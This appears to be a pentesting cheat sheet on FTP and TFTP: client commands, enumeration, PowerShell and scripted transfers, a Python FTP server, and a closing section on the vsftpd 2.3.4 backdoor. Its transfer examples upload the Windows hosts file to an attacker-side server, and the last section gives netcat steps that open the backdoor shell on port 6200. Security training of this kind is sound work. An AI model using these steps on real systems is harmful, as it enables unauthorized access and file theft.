---
icon: file-chart-column
description: File Transfer Protocol
---

# FTP

{% hint style="info" %}
* <mark style="color:purple;">Uses</mark> <mark style="color:orange;">**`Port 20`**</mark> <mark style="color:purple;">for</mark> <mark style="color:purple;">**Data**</mark> <mark style="color:purple;"></mark><mark style="color:purple;">and</mark> <mark style="color:orange;">**`Port 21`**</mark>**&#x20;**<mark style="color:purple;">**for Commands.**</mark>&#x20;
* <mark style="color:purple;">It can use</mark> <mark style="color:orange;">**`UDP`**</mark> <mark style="color:purple;">over</mark> <mark style="color:orange;">**`Port 69`**</mark> <mark style="color:purple;">for</mark> <mark style="color:orange;">**`TFTP`**</mark><mark style="color:purple;">.</mark>
* <mark style="color:purple;">Always check for</mark> <mark style="color:orange;">**`anonymous`**</mark> <mark style="color:purple;">login being enabled.</mark>
{% endhint %}

***

{% hint style="info" %}
### <mark style="color:purple;">Basic Commands</mark>

* <mark style="color:purple;">Start the service:</mark>

{% code lineNumbers="true" %}
```bash
ftp <IP>
tftp <IP>
```
{% endcode %}

* <mark style="color:purple;">To login as any other user:</mark>

```bash
USER <user>
```

* <mark style="color:purple;">To specify a password:</mark>

```bash
PASS <password>
```

* <mark style="color:purple;">Download a file:</mark>

```sh
get <file>
```

* <mark style="color:purple;">Upload a file:</mark>

```sh
put <file_path> <destination_path>
```

* <mark style="color:purple;">Passive mode:</mark>

```sh
passive
```

* <mark style="color:purple;">Change the local directory for downloads:</mark>

```sh
lcd /home/<your-username>
```

* <mark style="color:purple;">Exit the session:</mark>

```shell
quit
```

* <mark style="color:purple;">Transferring files using</mark> <mark style="color:orange;">**`powershell`**</mark><mark style="color:purple;">:</mark>

{% code overflow="wrap" %}
```powershell
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```
{% endcode %}

* <mark style="color:purple;">Upload a file using</mark> <mark style="color:orange;">**`powershell`**</mark>

```powershell
PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

* <mark style="color:purple;">If</mark> <mark style="color:orange;">**`anonymous`**</mark> <mark style="color:purple;">login is enabled, use</mark> <mark style="color:orange;">**`curl`**</mark><mark style="color:purple;">:</mark>

```sh
curl -O ftp://<server-address>/path/to/file
```

***

#### <mark style="color:orange;">`TFTP`</mark>

* <mark style="color:purple;">Uses</mark> <mark style="color:orange;">**`binary`**</mark> <mark style="color:purple;">mode for non-text files:</mark>

```sh
mode binary
```

* <mark style="color:purple;">Uses</mark> <mark style="color:orange;">**`ASCII`**</mark> <mark style="color:purple;">mode for text files:</mark>

```sh
mode ascii
```

* <mark style="color:purple;">To look for files in the</mark>  <mark style="color:orange;">**`TFTP`**</mark> <mark style="color:purple;">root:</mark>

```
find / -name file.txt
```
{% endhint %}

***

{% hint style="info" %}
## <mark style="color:purple;">Enumeration</mark>

* <mark style="color:purple;">Is always good practice to look for vulnerabilities:</mark>

```bash
searchsploit <version>
```

* <mark style="color:purple;">Check where you land:</mark>

```bash
pwd
```

* <mark style="color:purple;">List directories:</mark>

```bash
dir
```

* <mark style="color:purple;">This is the default config file for</mark> <mark style="color:orange;">**`TFTP`**</mark> <mark style="color:purple;">--></mark> <mark style="color:orange;">**`tftpd-hpa`**</mark>
{% endhint %}

***

{% hint style="info" %}
### <mark style="color:orange;">`FTP`</mark> <mark style="color:green;">`Python`</mark> <mark style="color:purple;">Server</mark>

* <mark style="color:purple;">First, Install the</mark> <mark style="color:green;">**`Python`**</mark> <mark style="color:purple;">module:</mark>

```sh
sudo pip3 install pyftpdlib
```

* <mark style="color:purple;">Then, set the server:</mark>

```sh
sudo python3 -m pyftpdlib --port 21
```

* <mark style="color:purple;">By default,</mark> <mark style="color:orange;">**`pyftpdlib`**</mark> <mark style="color:purple;">uses</mark> <mark style="color:orange;">**`Port 2121`**</mark><mark style="color:purple;">,</mark> <mark style="color:orange;">**`anonymous`**</mark> <mark style="color:purple;">authentication is enabled by default if we don't set a user and password.</mark>
* <mark style="color:purple;">Allow users to upload files:</mark>

```sh
sudo python3 -m pyftpdlib --port 21 --write
```
{% endhint %}

***

{% hint style="info" %}
### <mark style="color:purple;">Create a command file</mark>

* <mark style="color:purple;">Is possible to create command files and execute then using the</mark> <mark style="color:orange;">**`-s`**</mark> <mark style="color:purple;">flag:</mark>

```sh
ftp -v -n -s:ftpcommand.txt
```

* <mark style="color:purple;">Copy this in to a file to create a script that will</mark> <mark style="color:orange;">**`download`**</mark> <mark style="color:purple;">a file:</mark>

```sh
open 192.168.49.128
USER anonymous
binary
GET file.txt
bye
```

* <mark style="color:purple;">Copy this in to a file to create a script that will</mark> <mark style="color:orange;">**`upload`**</mark> <mark style="color:purple;">a file to the server:</mark>

```sh
open 192.168.49.128
USER anonymous
binary
PUT c:\windows\system32\drivers\etc\hosts
bye
```
{% endhint %}

***

{% hint style="danger" %}
## <mark style="color:purple;">Vulnerabilities</mark>

### <mark style="color:orange;">`vsftpd 2.3.4`</mark>

* <mark style="color:purple;">Connect to</mark> <mark style="color:orange;">**`FTP`**</mark> <mark style="color:purple;">with any username that contains</mark> <mark style="color:orange;">**`:)`**</mark><mark style="color:purple;">, and</mark> <mark style="color:orange;">**`any password`**</mark><mark style="color:purple;">.</mark>
* <mark style="color:purple;">Then connect to</mark> <mark style="color:orange;">**`port 6200`**</mark> <mark style="color:purple;">to get a shell:</mark>

```bash
nc 10.10.10.131 21
```

* <mark style="color:purple;">Now connect to the backdoor:</mark>

```bash
nc 10.10.10.131 6200
```

***


{% endhint %}
